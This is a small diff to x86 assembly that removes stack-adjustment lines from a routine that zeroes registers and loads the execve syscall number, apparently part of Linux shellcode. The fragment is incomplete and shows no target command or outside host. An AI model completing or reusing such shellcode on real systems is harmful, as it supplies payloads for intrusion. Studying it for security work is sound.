@@ -1,10 +1,6 @@
 	.text
 .globl _start
 _start:
-	movl	%esp, %ecx	# make some room on the stack
-	subb	$0x11, %ch
-	movl	%ecx, %esp
-
 	xorl	%ecx, %ecx
 	mull	%ecx		# %ecx = %eax = %edx = 0
 	addb	$11, %al	# %eax = __NR_execve
